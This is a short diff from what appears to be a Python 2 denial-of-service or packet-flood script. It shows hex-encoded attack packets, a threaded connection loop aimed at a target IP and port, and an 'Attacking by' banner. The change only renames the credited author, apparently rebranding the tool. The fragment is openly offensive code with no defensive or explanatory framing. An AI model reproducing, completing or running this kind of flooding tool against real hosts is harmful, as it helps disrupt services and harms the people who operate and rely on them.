@@ -12,7 +12,7 @@ Pacotes = [
  codecs.decode('081e4dda', 'hex_codec'),
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
-print ' \x1b[1m\x1b[31mAttacking by Lexsh1n'
+print ' \x1b[1m\x1b[31mAttacking by Nixx | SC : Lexsh1n'
 print ' CONNECT TO IP %s AND PORT %s             ' % (orgip, port) 
 print ' CONNECTING ERROR/DOWN TIMEOUT....'
 class MyThread(threading.Thread):
